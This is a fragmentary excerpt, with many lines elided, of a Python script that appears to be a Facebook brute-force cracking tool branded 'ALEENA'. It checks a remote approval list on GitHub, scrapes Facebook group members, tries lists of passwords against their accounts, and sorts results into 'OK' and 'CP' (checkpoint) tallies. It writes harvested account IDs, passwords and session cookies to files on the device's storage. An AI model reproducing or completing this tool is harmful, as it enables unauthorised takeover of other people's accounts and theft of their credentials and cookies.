...
def uaku():
	...
	try:
		...
		a=requests.get('https://github.com/Aleenakhan277/approvel.txt/blob/main/APPROVEL.txt').text
...
def grup():
	...
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Public","")
...
def passwrd():
	...
	print(f'                    {m}A {k}L {h}E {u}E {b}N {u}A  ★  {b}K {u}H {h} A{k} N{m} ')

	print('')

	print(f'RESULTS {h}ALEENA-OK{u} CHEK : {h}OK/%s {b}'%(okc))

	print(f'RESULTS {k}ALEENA-CP{h} CHEK : {k}CP/%s {b}'%(cpc))
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      🎀🤣 ALEENA OK 🤣🎀[green]')) 
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[purple]      🤣 ALEENA OK 🤣[purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/4MBF-ALEENA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='ALEENA-CP'))

					open('/sdcard/ALEENA-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
